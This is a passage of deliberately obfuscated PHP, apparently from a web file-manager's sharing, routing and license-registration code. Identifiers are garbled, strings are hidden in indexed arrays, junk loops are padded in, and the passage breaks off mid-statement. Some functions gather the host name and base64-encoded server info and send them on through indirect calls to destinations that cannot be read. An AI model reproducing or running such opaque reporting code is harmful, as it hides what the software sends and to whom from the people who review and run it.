$æº§Æ‘Ã)); $³ÃıÉÌ = $this->where($êŞ”’â€)->field($ şƒÆ¤Ç[490])->select(); $³ÃıÉÌ = array_to_keyvalue($³ÃıÉÌ, $ şƒÆ¤Ç[12], $ şƒÆ¤Ç[490]); $›‚ê¡£æ = array_diff($æº§Æ‘Ã, $³ÃıÉÌ); if (!empty($›‚ê¡£æ)) { foreach ($­ÅÊñ [$ şƒÆ¤Ç[375]] as $ËììÎğù => $¬Ì€ï¨ø) { if (in_array($¬Ì€ï¨ø[$ şƒÆ¤Ç[490]], $›‚ê¡£æ)) { unset($­ÅÊñ [$ şƒÆ¤Ç[375]][$ËììÎğù]); } } } } $this->_listDataApply($­ÅÊñ [$ şƒÆ¤Ç[375]]); return $­ÅÊñ ; } public function reportStatus($¡ã¯·³½) { $ñùÖùñ· =& $_SERVER[ë¦»ºéÌ]; $·à‹ö¯ó = array($ñùÖùñ·[403] => $¡ã¯·³½[$ñùÖùñ·[403]]); $£Ê¶šï = Model($ñùÖùñ·[1960])->where($·à‹ö¯ó)->field($ñùÖùñ·[1969])->find(); if (!$£Ê¶šï) { return !1; } $‚ç’ Î² = array($ñùÖùñ·[734] => $¡ã¯·³½[$ñùÖùñ·[734]]); if ($¡ã¯·³½[$ñùÖùñ·[734]] == $ñùÖùñ·[1965] && $£Ê¶šï[$ñùÖùñ·[734]] == $ñùÖùñ·[1965]) { $‚ç’ Î²[$ñùÖùñ·[734]] = 0; } $‰¯ÆÑó = Model($ñùÖùñ·[1960])->where($·à‹ö¯ó)->save($‚ç’ Î²); if ($¡ã¯·³½[$ñùÖùñ·[734]] == $ñùÖùñ·[437]) { if ($£Ê¶šï[$ñùÖùñ·[469]] != $ñùÖùñ·[202] && $this->shareFileMeta($£Ê¶šï[$ñùÖùñ·[469]])) { $this->shareFileMeta($£Ê¶šï[$ñùÖùñ·[469]], 0); } $this->remove($£Ê¶šï[$ñùÖùñ·[490]]); return !0; } if ($‰¯ÆÑó && $¡ã¯·³½[$ñùÖùñ·[734]] == $ñùÖùñ·[1965]) { $Å®ë­ŞŒ = $‚ç’ Î²[$ñùÖùñ·[734]] == $ñùÖùñ·[1965] ? 1 : 0; $this->shareFileMeta($£Ê¶šï[$ñùÖùñ·[469]], $Å®ë­ŞŒ); $this->removeByFile($£Ê¶šï[$ñùÖùñ·[469]]); } return $‰¯ÆÑó; } private function removeByFile($„éã±ì¼) { $ç»´¿¯´ =& $_SERVER[ë¦»ºéÌ]; $ùôôúâó = Model($ç»´¿¯´[809])->where(array($ç»´¿¯´[469] => $„éã±ì¼))->field($ç»´¿¯´[405])->select(); $¤¥Ù“®† = array_to_keyvalue($ùôôúâó, $ç»´¿¯´[12], $ç»´¿¯´[405]); $Ê‡«×­ = array($ç»´¿¯´[405] => array($ç»´¿¯´[7], $¤¥Ù“®†), $ç»´¿¯´[495] => 1); $ùôôúâó = $this->where($Ê‡«×­)->field($ç»´¿¯´[490])->select(); if (empty($ùôôúâó)) { return; } $æ®ùÔƒâ = array_to_keyvalue($ùôôúâó, $ç»´¿¯´[12], $ç»´¿¯´[490]); $this->remove($æ®ùÔƒâ); } private function shareFileMeta($¤ëÚÑÔ’, $±–’ É = null) { $øãáÛÍ‚ =& $_SERVER[ë¦»ºéÌ]; $´øÁÔÖŠ = array($øãáÛÍ‚[469] => $¤ëÚÑÔ’, $øãáÛÍ‚[105] => $øãáÛÍ‚[1970]); if (is_null($±–’ É)) { return Model($øãáÛÍ‚[1971])->where($´øÁÔÖŠ)->find(); } $´øÁÔÖŠ[$øãáÛÍ‚[380]] = $±–’ É; Model($øãáÛÍ‚[1971])->add($´øÁÔÖŠ, array(), !0); } } goto aÏ¡çì®Ğ²; B½óèíÌ¹: class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\x69\x6e\x64\145\170"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($ÕØÓÙ…ò) { $èÈ°ûâŠ =& $_SERVER[ë¦»ºéÌ]; $ä‹†¦œä =& $_SERVER[·´Å÷Ä]; $©ıéı = explode($ä‹†¦œä[0], trim($ÕØÓÙ…ò, $ä‹†¦œä[0])); $this->defaultModule = $©ıéı[0] ? $©ıéı[0] : $this->defaultModule; $this->defaultController = $©ıéı[1] ? $©ıéı[1] : $this->defaultController; $ÚİŒ´ğ = $èÈ°ûâŠ[612]; if (strlen($ÚİŒ´ğ) < $èÈ°ûâŠ[613]) { return; } $this->defaultAction = $©ıéı[2] ? $©ıéı[2] : $this->defaultAction; $ã „Øûú = $èÈ°ûâŠ[614]; $this->hmgrcb2f45c4($ä‹†¦œä[1], array($this, $ä‹†¦œä[2])); } public function appRun($‚‰‚’¯•) { $»¢œ¦¼Ù =& $_SERVER[ë¦»ºéÌ]; $„ÇÖò“Á =& $_SERVER[·´Å÷Ä]; $Õ‚ãş‘İ = explode($„ÇÖò“Á[0], $‚‰‚’¯•); $Ÿ‡±Êü£ = strtolower($Õ‚ãş‘İ[0]); $ÈªøÁĞ = $„ÇÖò“Á[3]; if ($Ÿ‡±Êü£ == $„ÇÖò“Á[4]) { $ÈªøÁĞ = $„ÇÖò“Á[5]; $Õ‚ãş‘İ[0] = $„ÇÖò“Á[6]; $Õ‚ãş‘İ[1] = $Õ‚ãş‘İ[1] . $„ÇÖò“Á[7]; $‚‰‚’¯• = join($„ÇÖò“Á[0], $Õ‚ãş‘İ); $‚‰‚’¯• = trim($‚‰‚’¯•, $„ÇÖò“Á[0]); } call_user_func(array($„ÇÖò“Á[8], $„ÇÖò“Á[9]), $ÈªøÁĞ . $„ÇÖò“Á[10], $‚‰‚’¯•); ActionCall($‚‰‚’¯•); $Ìİê¯Ï– = $»¢œ¦¼Ù[615]; while ($Ìİê¯Ï– < $»¢œ¦¼Ù[616]) { if ($Ìİê¯Ï– >= 0) { break; } $Ìİê¯Ï–++; } call_user_func(array($„ÇÖò“Á[8], $„ÇÖò“Á[9]), $ÈªøÁĞ . $„ÇÖò“Á[11], $‚‰‚’¯•); $îÄ—¢«Û = $»¢œ¦¼Ù[617]; } private function autorun() { $°ö§î¡Û =& $_SERVER[ë¦»ºéÌ]; $›Í‰¾˜ =& $_SERVER[·´Å÷Ä]; global $config; if (count($config[$›Í‰¾˜[12]]) == 0) { return; } foreach ($config[$›Í‰¾˜[12]] as $ıƒôèòì => $Ò“ª˜åâ) { $this->appRun($Ò“ª˜åâ); $Ò„¨÷ŞŒ = $°ö§î¡Û[618]; while (strlen($Ò„¨÷ŞŒ) < $°ö§î¡Û[613]) { if (!$Ò„¨÷ŞŒ) { break; } $Ò„¨÷ŞŒ++; } } } private function xzaj470c46c8() { $íå½¢± =& $_SERVER[ë¦»ºéÌ]; $‹æƒËƒí =& $_SERVER[·´Å÷Ä]; $Ü—¨ÃâÑ = $‹æƒËƒí[4]; $…ÃŠæª¿ = $GLOBALS[$‹æƒËƒí[13]][$‹æƒËƒí[14]][0]; $ùÄ“ƒÄÏ = $íå½¢±[619]; if (!$ùÄ“ƒÄÏ) { return; } if (!$…ÃŠæª¿ || strlen($…ÃŠæª¿) <= strlen($Ü—¨ÃâÑ)) { return; } if (strtolower(substr($…ÃŠæª¿, -strlen($Ü—¨ÃâÑ))) != $Ü—¨ÃâÑ) { return; } $Ù¨‘ü‘¯ = substr($…ÃŠæª¿, 0, -strlen($Ü—¨ÃâÑ)); $õÆÉï¤† = array($‹æƒËƒí[4], $Ù¨‘ü‘¯); $¸­Îû›ä = array_slice($GLOBALS[$‹æƒËƒí[13]][$‹æƒËƒí[14]], 1); $GLOBALS[$‹æƒËƒí[13]][$‹æƒËƒí[14]] = array_merge($õÆÉï¤†, $¸­Îû›ä); $Û™Øæá = $íå½¢±[620]; if (strlen($Û™Øæá) < $íå½¢±[616]) { die; } $GLOBALS[$‹æƒËƒí[13]][$‹æƒËƒí[15]] = implode($‹æƒËƒí[0], $GLOBALS[$‹æƒËƒí[13]][$‹æƒËƒí[14]]); $îêå¶² = $íå½¢±[621]; while ($îêå¶² < $íå½¢±[613]) { if ($îêå¶² >= 0) { break; } $îêå¶²++; } } private function mbsv5acde726() { $ĞÎÖÓê² =& $_SERVER[ë¦»ºéÌ]; $À–ßÛÔ° =& $_SERVER[·´Å÷Ä]; if ($GLOBALS[$À–ßÛÔ°[13]][$À–ßÛÔ°[15]] != $À–ßÛÔ°[6]) { return; } $òºä›¾é = $_SERVER[$À–ßÛÔ°[16]]; $î¶üù¦ˆ = $ĞÎÖÓê²[622]; if (!$î¶üù¦ˆ) { die; } $øõŞ¸Ç¬ = $À–ßÛÔ°[17]; $×õÑíÍ½ = $ĞÎÖÓê²[623]; if (!$×õÑíÍ½) { return; } if (!strstr($òºä›¾é, $øõŞ¸Ç¬)) { return; } $»¢êÕÂø = strrpos($òºä›¾é, $øõŞ¸Ç¬); $°˜Åèß€ = substr($òºä›¾é, $»¢êÕÂø + strlen($øõŞ¸Ç¬)); preg_match_all($À–ßÛÔ°[18], $°˜Åèß€, $Ìë¸†½å); $°˜Åèß€ = trim($Ìë¸†½å[0][0], $À–ßÛÔ°[19]); $GLOBALS[$À–ßÛÔ°[13]][$À–ßÛÔ°[14]] = explode($À–ßÛÔ°[19], $°˜Åèß€); $GLOBALS[$À–ßÛÔ°[13]][$À–ßÛÔ°[15]] = implode($À–ßÛÔ°[0], $GLOBALS[$À–ßÛÔ°[13]][$À–ßÛÔ°[14]]); } public function run() { $åÒªÊ‚¿ =& $_SERVER[ë¦»ºéÌ]; $ıó û± =& $_SERVER[·´Å÷Ä]; $this->mbsv5acde726(); $this->xzaj470c46c8(); $ş¶¦—öö = $åÒªÊ‚¿[624]; while ($ş¶¦—öö < $åÒªÊ‚¿[613]) { if ($ş¶¦—öö >= 0) { break; } $ş¶¦—öö++; } $“”õ–œ = $GLOBALS[$ıó û±[13]][$ıó û±[14]]; $›ï£ı = $GLOBALS[$ıó û±[13]][$ıó û±[15]]; $ïû†÷À² = $åÒªÊ‚¿[625]; if (strlen($ïû†÷À²) < $åÒªÊ‚¿[616]) { return; } define($ıó û±[20], isset($“”õ–œ[0]) && $“”õ–œ[0] ? $“”õ–œ[0] : $this->defaultModule); $½ãâ†Ÿ­ = $åÒªÊ‚¿[626]; if (!$½ãâ†Ÿ­) { die; } define($ıó û±[21], isset($“”õ–œ[1]) && $“”õ–œ[0] ? $“”õ–œ[1] : $this->defaultController); define($ıó û±[22], isset($“”õ–œ[2]) && $“”õ–œ[0] ? $“”õ–œ[2] : $this->defaultAction); define($ıó û±[23], MOD . $ıó û±[0] . ST . $ıó û±[0] . ACT); $¼­¸Á® = $åÒªÊ‚¿[627]; while (strlen($¼­¸Á®) < $åÒªÊ‚¿[628]) { if (!$¼­¸Á®) { break; } $¼­¸Á®++; } $_SERVER[$ıó û±[24]] = strtolower(ACTION); $™ş„‹â = $åÒªÊ‚¿[629]; while (strlen($™ş„‹â) < $åÒªÊ‚¿[628]) { if (!$™ş„‹â) { break; } $™ş„‹â++; } $this->autorun(); if (count($“”õ–œ) >= 3) { $this->appRun($›ï£ı); } else { $this->appRun(ACTION); } } private $yfcn1b8cc74d = array(); private $yaec5d6e5af9 = ''; public function wjke1ea9e109() { $öºî¾”ç =& $_SERVER[ë¦»ºéÌ]; $…éÄ•Õê =& $_SERVER[·´Å÷Ä]; $this->bcxm44305ccd(); $İğ ×Ğí = $öºî¾”ç[630]; if (!$İğ ×Ğí) { return; } $this->rdzw96650481(); $‹ÕÖ²ñ” = $öºî¾”ç[631]; $this->zihl540044f8(); $this->oxad94f10db3(); $ïà…ßÚø = $öºî¾”ç[632]; if (strlen($ïà…ßÚø) < $öºî¾”ç[613]) { die; } $this->vbux47d64078(); $this->ifhuec0bb860(); $this->avfz068aefa0(); $this->hmgrcb2f45c4($…éÄ•Õê[25], array($this, $…éÄ•Õê[26])); $·íªá‡´ = $öºî¾”ç[633]; if (strlen($·íªá‡´) < $öºî¾”ç[616]) { return; } $this->hmgrcb2f45c4($…éÄ•Õê[27], array($this, $…éÄ•Õê[28])); $this->hmgrcb2f45c4($…éÄ•Õê[29], array($this, $…éÄ•Õê[30])); $this->hmgrcb2f45c4($…éÄ•Õê[31], array($this, $…éÄ•Õê[32])); } public function bpdib47d3809($Ş±ÁÈãò) { $ï“ıÑÙ¹ =& $_SERVER[ë¦»ºéÌ]; $ìÔ—„Â· =& $_SERVER[·´Å÷Ä]; $„È„”Û· = Model($ìÔ—„Â·[33])->get(); $Ëç¸™Ö½ = $ï“ıÑÙ¹[634]; $«‡ú‚¯ë = array($ìÔ—„Â·[34], $ìÔ—„Â·[35], $ìÔ—„Â·[36], $ìÔ—„Â·[37], $ìÔ—„Â·[38], $ìÔ—„Â·[39], $ìÔ—„Â·[40], $ìÔ—„Â·[41], $ìÔ—„Â·[42], $ìÔ—„Â·[43], $ìÔ—„Â·[44], $ìÔ—„Â·[45], $ìÔ—„Â·[46], $ìÔ—„Â·[47], $ìÔ—„Â·[48], $ìÔ—„Â·[49], $ìÔ—„Â·[50], $ìÔ—„Â·[51], $ìÔ—„Â·[52], $ìÔ—„Â·[53], $ìÔ—„Â·[54], $ìÔ—„Â·[55], $ìÔ—„Â·[56], $ìÔ—„Â·[57], $ìÔ—„Â·[58], $ìÔ—„Â·[59], $ìÔ—„Â·[60], $ìÔ—„Â·[61], $ìÔ—„Â·[62], $ìÔ—„Â·[63], $ìÔ—„Â·[64], $ìÔ—„Â·[65], $ìÔ—„Â·[66], $ìÔ—„Â·[67], $ìÔ—„Â·[68], $ìÔ—„Â·[69], $ìÔ—„Â·[70], $ìÔ—„Â·[71], $ìÔ—„Â·[72], $ìÔ—„Â·[73], $ìÔ—„Â·[74], $ìÔ—„Â·[75], $ìÔ—„Â·[76], $ìÔ—„Â·[77], $ìÔ—„Â·[78], $ìÔ—„Â·[79], $ìÔ—„Â·[80], $ìÔ—„Â·[81], $ìÔ—„Â·[82]); foreach ($«‡ú‚¯ë as $¯¯²×ó) { $Ä¨±üÅ³ = $GLOBALS[$ìÔ—„Â·[83]][$ìÔ—„Â·[84]][$¯¯²×ó]; $ú¤¸éøÎ = $ï“ıÑÙ¹[635]; if (!$ú¤¸éøÎ) { die; } if (isset($„È„”Û·[$¯¯²×ó])) { $Ä¨±üÅ³ = $„È„”Û·[$¯¯²×ó]; } $Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$¯¯²×ó] = $Ä¨±üÅ³; } $”ãù„­à = $Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$ìÔ—„Â·[46]]; unset($Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[87]][$ìÔ—„Â·[88]]); $²æ×êÇ„ = $ï“ıÑÙ¹[636]; unset($Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[87]][$ìÔ—„Â·[89]]); unset($Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$ìÔ—„Â·[46]]); unset($Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$ìÔ—„Â·[90]]); $Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$ìÔ—„Â·[91]] = array($ìÔ—„Â·[92] => (int) $”ãù„­à[$ìÔ—„Â·[93]], $ìÔ—„Â·[94] => (int) _get($”ãù„­à, $ìÔ—„Â·[95], 0)); $É³¯ÁÇŞ = $ï“ıÑÙ¹[637]; if (!$É³¯ÁÇŞ) { return; } $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[97]] = Action($ìÔ—„Â·[98])->accessToken(); $£¤†Ï„¬ = $ï“ıÑÙ¹[638]; if (strlen($£¤†Ï„¬) < $ï“ıÑÙ¹[628]) { die; } $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[99]] = md5($_SERVER[$ìÔ—„Â·[100]] . $„È„”Û·[$ìÔ—„Â·[101]]); $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[102]] = base64_encode(serverInfo()); $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[103]] = $this->yaec5d6e5af9; if ($„È„”Û·[$ìÔ—„Â·[103]] != $ìÔ—„Â·[104]) { $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[105]] = $„È„”Û·[$ìÔ—„Â·[105]]; $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[106]] = $„È„”Û·[$ìÔ—„Â·[106]]; $ä•ú·Ïè = rand_string(10) . $this->yaec5d6e5af9 . rand_string(5); $Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[107]][$ìÔ—„Â·[108]] = $this->sifj443386fc($ä•ú·Ïè, $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[99]]); } if ($this->yaec5d6e5af9 == $ìÔ—„Â·[104]) { $Ş±ÁÈãò[$ìÔ—„Â·[85]][$ìÔ—„Â·[86]][$ìÔ—„Â·[91]][$ìÔ—„Â·[95]] = 0; } $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[109]] = _get($this->yfcn1b8cc74d, $ìÔ—„Â·[110], $ìÔ—„Â·[6]); $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[111]] = _get($this->yfcn1b8cc74d, $ìÔ—„Â·[112], $ìÔ—„Â·[6]); $½·üú­ = $ï“ıÑÙ¹[639]; while ($½·üú­ < $ï“ıÑÙ¹[613]) { if ($½·üú­ >= 0) { break; } $½·üú­++; } if (_get($GLOBALS, $ìÔ—„Â·[113]) && $this->config[$ìÔ—„Â·[114]]) { $Ş±ÁÈãò[$ìÔ—„Â·[96]][$ìÔ—„Â·[115]] = WEB_ROOT; } return $Ş±ÁÈãò; } private function ifhuec0bb860() { $éø›¥¦ =& $_SERVER[ë¦»ºéÌ]; $²Ïâòˆ =& $_SERVER[·´Å÷Ä]; if ($_SERVER[$²Ïâòˆ[24]] == $²Ïâòˆ[116]) { $ˆ×ò‡³‹ = array($²Ïâòˆ[103] => $this->yaec5d6e5af9, $²Ïâòˆ[117] => $this->iqbe282eb69e(), $²Ïâòˆ[118] => Model($²Ïâòˆ[119])->count()); if ($this->yaec5d6e5af9 != $²Ïâòˆ[104]) { $²æ•ŸÉ™ = _get($this->yfcn1b8cc74d, $²Ïâòˆ[120]); if ($²æ•ŸÉ™) { $ˆ×ò‡³‹[$²Ïâòˆ[121]] = $²æ•ŸÉ™; $ˆ×ò‡³‹[$²Ïâòˆ[122]] = strtotime(_get($this->yfcn1b8cc74d, $²Ïâòˆ[123])); $ˆ×ò‡³‹[$²Ïâòˆ[124]] = _get($this->yfcn1b8cc74d, $²Ïâòˆ[112]); } $ÏÑ‘¨¢¢ = Model($²Ïâòˆ[33])->get($²Ïâòˆ[125], $²Ïâòˆ[6], !0); if (is_string($ÏÑ‘¨¢¢) && substr($ÏÑ‘¨¢¢, 0, 1) == $²Ïâòˆ[126]) { $ÏÑ‘¨¢¢ = json_decode_force($ÏÑ‘¨¢¢); } if (is_array($ÏÑ‘¨¢¢) && $ÏÑ‘¨¢¢[$²Ïâòˆ[127]] && strstr($ÏÑ‘¨¢¢[$²Ïâòˆ[127]], $²Ïâòˆ[128])) { $°É—”Ññ = explode($²Ïâòˆ[128], $ÏÑ‘¨¢¢[$²Ïâòˆ[127]]); $ˆ×ò‡³‹[$²Ïâòˆ[129]] = $°É—”Ññ[0]; } } $ˆ×ò‡³‹ = $this->jvbycdc38ad1(json_encode($ˆ×ò‡³‹), md5($²Ïâòˆ[130])); $Ÿ……‚‰Å = array($²Ïâòˆ[131] => $ˆ×ò‡³‹); call_user_func(array($²Ïâòˆ[132], $²Ïâòˆ[133]), $Ÿ……‚‰Å); } if ($this->yaec5d6e5af9 == $²Ïâòˆ[104]) { return; } $¡ÙŞÒõò = array($²Ïâòˆ[134], $²Ïâòˆ[135], $²Ïâòˆ[136], $²Ïâòˆ[137], $²Ïâòˆ[138], $²Ïâòˆ[139]); $Æö¦’Û© = Model($²Ïâòˆ[33])->get(); $Ÿ……‚‰Å = array($²Ïâòˆ[140] => $Æö¦’Û©[$²Ïâòˆ[34]], $²Ïâòˆ[141] => $Æö¦’Û©[$²Ïâòˆ[35]], $²Ïâòˆ[142] => $²Ïâòˆ[6]); foreach ($¡ÙŞÒõò as $Â¹Îœ¨Ñ) { if (!isset($Æö¦’Û©[$Â¹Îœ¨Ñ]) || !$Æö¦’Û©[$Â¹Îœ¨Ñ]) { continue; } $Ÿ……‚‰Å[$Â¹Îœ¨Ñ] = $Æö¦’Û©[$Â¹Îœ¨Ñ]; $«£ÔŞã§ = $éø›¥¦[640]; } call_user_func(array($²Ïâòˆ[132], $²Ïâòˆ[133]), $Ÿ……‚‰Å); $Ä™»ƒà = $éø›¥¦[641]; if (strlen($Ä™»ƒà) < $éø›¥¦[642]) { die; } } private function oxad94f10db3() { $ÌÔ­°‰ =& $_SERVER[ë¦»ºéÌ]; $ÃĞÀ‚€Ş =& $_SERVER[·´Å÷Ä]; if ($_SERVER[$ÃĞÀ‚€Ş[24]] != $ÃĞÀ‚€Ş[143]) { return; } if (!_get($GLOBALS, $ÃĞÀ‚€Ş[113])) { die; } $¦¬ı–’¯ = $GLOBALS[$ÃĞÀ‚€Ş[13]]; if (isset($¦¬ı–’¯[$ÃĞÀ‚€Ş[144]])) { $this->vpmu31fee280(); die; } if (!isset($¦¬ı–’¯[$ÃĞÀ‚€Ş[145]]) || strlen($¦¬ı–’¯[$ÃĞÀ‚€Ş[145]]) != 16) { show_json($ÃĞÀ‚€Ş[146] . $¦¬ı–’¯[$ÃĞÀ‚€Ş[145]], !1); } $ÜƒñÉ¡ï = Model($ÃĞÀ‚€Ş[33])->get($ÃĞÀ‚€Ş[101]); $ÖşÏÄ½û = md5($_SERVER[$ÃĞÀ‚€Ş[100]] . $ÜƒñÉ¡ï); $Ñ£ŞªÉ = $ÌÔ­°‰[643]; if (!$Ñ£ŞªÉ) { return; } $õšå¸Šµ = array($ÃĞÀ‚€Ş[145] => $¦¬ı–’¯[$ÃĞÀ‚€Ş[145]], $ÃĞÀ‚€Ş[147] => rand_string(16), $ÃĞÀ‚€Ş[148] => $ÃĞÀ‚€Ş[130], $ÃĞÀ‚€Ş[149] => $ÃĞÀ‚€Ş[150], $ÃĞÀ‚€Ş[151] => $_SERVER[$ÃĞÀ‚€Ş[152]], $ÃĞÀ‚€Ş[153] => $_SERVER[$ÃĞÀ‚€Ş[154]], $ÃĞÀ‚€Ş[155] => $_SERVER[$ÃĞÀ‚€Ş[156]], $ÃĞÀ‚€Ş[99] => $ÖşÏÄ½û, $ÃĞÀ‚€Ş[157] => Model($ÃĞÀ‚€Ş[33])->get($ÃĞÀ‚€Ş[125])); if ($¦¬ı–’¯[$ÃĞÀ‚€Ş[158]] == $ÃĞÀ‚€Ş[159]) { $ù³ºŠ“¢ = $this->jvbycdc38ad1($ÖşÏÄ½û, $ÃĞÀ‚€Ş[160]); $‘¹…Î¯ = $this->sifj443386fc(json_encode($õšå¸Šµ), $ÖşÏÄ½û . $ÃĞÀ‚€Ş[161], 3); $‘¹…Î¯ = $‘¹…Î¯ . $ÃĞÀ‚€Ş[162] . $_SERVER[$ÃĞÀ‚€Ş[152]]; $¹şÉ´¼ô = $this->logydd36e9a4($ÃĞÀ‚€Ş[163] . $ù³ºŠ“¢ . $ÃĞÀ‚€Ş[164] . $‘¹…Î¯, -1); show_json($¹şÉ´¼ô, !0); } else { if ($¦¬ı–’¯[$ÃĞÀ‚€Ş[158]] == $ÃĞÀ‚€Ş[165]) { $Şâü•Æš = substr(md5($ÃĞÀ‚€Ş[166] . $ÖşÏÄ½û), 12, 15) . $ÃĞÀ‚€Ş[167]; $‘¹…Î¯ = $this->jvky07d81805(trim($¦¬ı–’¯[$ÃĞÀ‚€Ş[168]]), $Şâü•Æš, 2); $ŠĞğºäİ = json_decode($‘¹…Î¯, !0); if (!is_array($ŠĞğºäİ) || !is_array($ŠĞğºäİ[$ÃĞÀ‚€Ş[169]]) || $ŠĞğºäİ[$ÃĞÀ‚€Ş[145]] != !0) { $÷æ‡ê³Í = $ÃĞÀ‚€Ş[170]; $¥‹«ªø = $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]] ? $ÃĞÀ‚€Ş[171] . $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]] : $÷æ‡ê³Í; show_json($¥‹«ªø, !1); } else { $õšå¸Šµ[$ÃĞÀ‚€Ş[147]] = $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]][$ÃĞÀ‚€Ş[172]]; } } else { $ŠĞğºäİ = $this->logydd36e9a4($ÃĞÀ‚€Ş[173], $õšå¸Šµ, 10); $›Û’È = $ÌÔ­°‰[644]; if (strlen($›Û’È) < $ÌÔ­°‰[616]) { return; } } } if (!is_array($ŠĞğºäİ) || !is_array($ŠĞğºäİ[$ÃĞÀ‚€Ş[169]]) || $ŠĞğºäİ[$ÃĞÀ‚€Ş[145]] != !0) { $÷æ‡ê³Í = LNG($ÃĞÀ‚€Ş[174]); $¥‹«ªø = $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]] ? $ÃĞÀ‚€Ş[171] . $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]] : $÷æ‡ê³Í; show_json($¥‹«ªø, !1); } $•ğ±Âá = $ŠĞğºäİ[$ÃĞÀ‚€Ş[169]]; $ûç¬§™á = $this->ovhz7d400899($•ğ±Âá[$ÃĞÀ‚€Ş[175]]); $Ã«úİúĞ = $ÌÔ­°‰[645]; if (!$ûç¬§™á || $ûç¬§™á != $•ğ±Âá[$ÃĞÀ‚€Ş[123]]) { $ğ±şàÃ¥ = array($ÃĞÀ‚€Ş[176] => Model($ÃĞÀ‚€Ş[33])->get($ÃĞÀ‚€Ş[101]), $ÃĞÀ‚€Ş[177] => $_SERVER[$ÃĞÀ‚€Ş[100]], $ÃĞÀ‚€Ş[178] => this_url(), $ÃĞÀ‚€Ş[153] => $_SERVER[$ÃĞÀ‚€Ş[154]]); $‘¹…Î¯ = $this->quytd2addd2f(json_encode($ğ±şàÃ¥)); $this->logydd36e9a4($ÃĞÀ‚€Ş[179] . $‘¹…Î¯); show_json(LNG($ÃĞÀ‚€Ş[180]), !0); } $†Û¥ªÂµ = array($ÃĞÀ‚€Ş[181] => $•ğ±Âá[$ÃĞÀ‚€Ş[182]], $ÃĞÀ‚€Ş[183] => $•ğ±Âá[$ÃĞÀ‚€Ş[184]], $ÃĞÀ‚€Ş[185] => rand_string(16), $ÃĞÀ‚€Ş[103] => $•ğ±Âá[$ÃĞÀ‚€Ş[186]]); if ($õšå¸Šµ[$ÃĞÀ‚€Ş[147]]) { $†Û¥ªÂµ[$ÃĞÀ‚€Ş[185]] = $õšå¸Šµ[$ÃĞÀ‚€Ş[147]]; } $­Ô¡ÄÏÕ = substr(md5($†Û¥ªÂµ[$ÃĞÀ‚€Ş[183]]), 10, 10); $£İ¶àÆÂ = $­Ô¡ÄÏÕ . $†Û¥ªÂµ[$ÃĞÀ‚€Ş[103]] . $†Û¥ªÂµ[$ÃĞÀ‚€Ş[185]]; $é»ø¡ÉØ = $ÌÔ­°‰[646]; if (!$é»ø¡ÉØ) { die; } $†Û¥ªÂµ[$ÃĞÀ‚€Ş[105]] = strrev(base64_encode($this->jvbycdc38ad1($£İ¶àÆÂ, $ÃĞÀ‚€Ş[187]))); $¹æÏ ¢Ù = $ÌÔ­°‰[647]; while ($¹æÏ ¢Ù < $ÌÔ­°‰[628]) { if ($¹æÏ ¢Ù >= 0) { break; } $¹æÏ ¢Ù++; } $ü…àÄÇ· = rand_string(16); $°ç©» = $ü…àÄÇ· . $†Û¥ªÂµ[$ÃĞÀ‚€Ş[103]] . $this->jvbycdc38ad1(md5($†Û¥ªÂµ[$ÃĞÀ‚€Ş[181]]), $ü…àÄÇ·); $†Û¥ªÂµ[$ÃĞÀ‚€Ş[106]] = base64_encode(strrev($this->jvbycdc38ad1($°ç©», $ÃĞÀ‚€Ş[188]))); if ($•ğ±Âá[$ÃĞÀ‚€Ş[189]] && $•ğ±Âá[$ÃĞÀ‚€Ş[189]] >= 1) { Model($ÃĞÀ‚€Ş[33])->setDeep($ÃĞÀ‚€Ş[190], $ÃĞÀ‚€Ş[191]); } Model($ÃĞÀ‚€Ş[33])->set($†Û¥ªÂµ); $šØş¸Í = md5($_SERVER[$ÃĞÀ‚€Ş[100]] . strrev($ÜƒñÉ¡ï) . $†Û¥ªÂµ[$ÃĞÀ‚€Ş[183]]); $ÓÙ¬©›Å = strrev(substr($šØş¸Í, 10, 16)); $¼…ÜÇÁ = $this->sifj443386fc(json_encode($•ğ±Âá), $šØş¸Í); $í¼“Ö¨ì = array_to_keyvalue(Model($ÃĞÀ‚€Ş[7])->listData(), $ÃĞÀ‚€Ş[192]); $£îãş²‰ = $í¼“Ö¨ì[$ÃĞÀ‚€Ş[193]]; $™¯¹‰Äá = $ÌÔ­°‰[648]; while ($™¯¹‰Äá < $ÌÔ­°‰[628]) { if ($™¯¹‰Äá >= 0) { break; } $™¯¹‰Äá++; } $ƒÍøØ‡´ = array(); $Ôö¬”€« = $ÌÔ­°‰[649]; if (!$Ôö¬”€«) { die; } $ƒÍøØ‡´[$ÓÙ¬©›Å] = $¼…ÜÇÁ; $¯¼÷Û€  = $ÌÔ­°‰[650]; Model($ÃĞÀ‚€Ş[7])->update($£îãş²‰[$ÃĞÀ‚€Ş[194]], array($ÃĞÀ‚€Ş[195] => $ƒÍøØ‡´)); $this->yfcn1b8cc74d = $•ğ±Âá; $”Ò«ã®¢ = $ÌÔ­°‰[651]; $this->yaec5d6e5af9 = 